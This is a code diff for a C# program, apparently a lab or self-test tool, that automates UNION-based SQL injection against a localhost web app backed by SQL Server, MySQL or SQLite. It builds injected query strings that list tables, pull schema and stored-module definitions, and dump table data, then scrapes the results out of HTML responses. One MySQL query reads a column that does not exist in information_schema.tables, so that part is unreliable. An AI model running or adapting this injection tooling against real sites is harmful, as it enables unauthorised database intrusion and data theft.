@@ -28,6 +28,7 @@ namespace Vizsgalo
         {
             BaseAddress = new Uri("http://localhost:5227/Users/Sqlserver/")
             // BaseAddress = new Uri("http://localhost:5227/Users/Mysql/")
+            // BaseAddress = new Uri("http://localhost:5227/Users/Sqlite/")
         };
 
         public static async Task Main()
@@ -84,7 +85,7 @@ namespace Vizsgalo
                     if (unionResponse.StatusCode == HttpStatusCode.OK)
                     {
                         _db = "sqlite";
-                        _dbVersion = jsonUnionResponse;
+                        _dbVersion = jsonUnionResponse.Contains("sqlite3") || jsonUnionResponse.Contains("3.4") ? "3.4" : "old-sqlite";
                     }
                 }
                 else // else it checks whether it is SQL Server or MySql
@@ -97,7 +98,7 @@ namespace Vizsgalo
                     else
                     {
                         _db = "mysql";
-                        _dbVersion = jsonUnionResponse;
+                        _dbVersion = jsonUnionResponse.Split("MariaDB")[0] + "MariaDB";
                     }
                     // Console.WriteLine($"{jsonUnionResponse}\n");
                 }
@@ -182,7 +183,7 @@ namespace Vizsgalo
             } else if (_db == "sqlite")
             {
                 // SQLite - GET
-                //TODO
+                Console.WriteLine("Work in progress"); //TODO
             }
         }
         
@@ -201,31 +202,36 @@ namespace Vizsgalo
             } else if (_db == "sqlite")
             {
                 // SQLite - GET
-                //TODO
+                string url = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "name FROM sqlite_schema where type = 'table';--";
+                await SqliteGet(httpClient, url);
             }
         }
         
         static async Task GetTableSchema(HttpClient httpClient, string tableName, string firstQueryParameter)
         {
-            string columnNamesUrl = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "column_name FROM information_schema.columns where table_name = '" + tableName + "';--";
-            string dataTypesUrl = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "data_type FROM information_schema.columns where table_name = '" + tableName + "';--";
+            // string columnNamesUrl = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "column_name FROM information_schema.columns where table_name = '" + tableName + "';--";
+            // string dataTypesUrl = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "data_type FROM information_schema.columns where table_name = '" + tableName + "';--";
+            
 
             if (_db == "sqlserver")
             {
                 // SQL Server - GET
-                await SqlServerGet(httpClient, columnNamesUrl);
-                
-                await SqlServerGet(httpClient, dataTypesUrl);
+                // await SqlServerGet(httpClient, columnNamesUrl);
+                // await SqlServerGet(httpClient, dataTypesUrl);
+                string url = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "definition from sys.sql_modules where object_id = OBJECT_ID('" + tableName + "');--";
+                await SqlServerGet(httpClient, url);
             } else if (_db == "mysql")
             {
                 // MySQL - GET
-                await MySqlGet(httpClient, columnNamesUrl);
-                
-                await MySqlGet(httpClient, dataTypesUrl);
+                // await MySqlGet(httpClient, columnNamesUrl);
+                // await MySqlGet(httpClient, dataTypesUrl);
+                string url = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "create_table_statement from information_schema.tables where table_name = '" + tableName + "';--";
+                await MySqlGet(httpClient, url);
             } else if (_db == "sqlite")
             {
                 // SQLite - GET
-                //TODO
+                string url = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "sql from sqlite_schema where type = 'table' and name = '" + tableName + "';--";
+                await SqliteGet(httpClient, url);
             }
         }
         
@@ -246,7 +252,7 @@ namespace Vizsgalo
             {
                 // SQLite - GET
                 Console.WriteLine("Getting all data using SQLite...");
-                //TODO
+                await SqliteGet(httpClient, url);
             }
         }
         
@@ -262,7 +268,9 @@ namespace Vizsgalo
             //     .WriteRequestToConsole();
     
             var jsonResponse = await response.Content.ReadAsStringAsync();
-            Console.WriteLine($"{jsonResponse}\n");
+            string[] filteredResponse = FilterResponse(jsonResponse).Split("|||");
+            Console.WriteLine(filteredResponse[0]);
+            Console.WriteLine(filteredResponse[1]);
         }
         
         
@@ -276,7 +284,49 @@ namespace Vizsgalo
             //     .WriteRequestToConsole();
     
             var jsonResponse = await response.Content.ReadAsStringAsync();
-            Console.WriteLine($"{jsonResponse}\n");
+            string[] filteredResponse = FilterResponse(jsonResponse).Split("|||");
+            Console.WriteLine($"{filteredResponse[0]}\n");
+            Console.WriteLine($"{filteredResponse[1]}\n");
+        }
+        
+        
+        static async Task SqliteGet(HttpClient httpClient, string url)
+        {
+            using HttpResponseMessage response = await httpClient.GetAsync(url);
+            
+            Console.WriteLine(response.RequestMessage);
+            
+            // response.EnsureSuccessStatusCode()
+            //     .WriteRequestToConsole();
+    
+            var jsonResponse = await response.Content.ReadAsStringAsync();
+            string[] filteredResponse = FilterResponse(jsonResponse).Split("|||");
+            Console.WriteLine($"{filteredResponse[0]}\n");
+            Console.WriteLine($"{filteredResponse[1]}\n");
+        }
+
+
+        static string FilterResponse(string fullResponse)
+        {
+            string tableHead = fullResponse.Split("<thead")[1].Split("</thead>")[0];
+            string[] tableHeadCellsArray = tableHead.Split("<th");
+            string tableHeadCells = "";
+            // for (int i = 1; i < tableHeadCellsArray.Length; i++)
+            // {
+            //     tableHeadCells = tableHeadCells == "" ? tableHeadCellsArray[i].Split("</th>")[0].Split(">")[1] : tableHeadCells + " | " + tableHeadCellsArray[i].Split("</th>")[0].Split(">")[1];
+            // }
+            
+            string tableBody = fullResponse.Split("<tbody>")[1].Split("</tbody>")[0];
+            string[] tableBodyCellsArray = tableBody.Split("<td");
+            string tableBodyCells = "";
+            tableBodyCellsArray = tableBodyCellsArray.Skip(1).ToArray();
+            for (int i = 0; i < tableBodyCellsArray.Length; i++)
+            {
+                tableBodyCells = tableBodyCells == "" ? tableBodyCellsArray[i].Split("</td>")[0].Split(">")[1] :
+                    i % (_unionNumber + 1) == 0 ? tableBodyCells + "\n" + tableBodyCellsArray[i].Split("</td>")[0].Split(">")[1]:
+                tableBodyCells + " | " + tableBodyCellsArray[i].Split("</td>")[0].Split(">")[1];
+            }
+            return tableHeadCells + "|||" + tableBodyCells;
         }
     }
 }
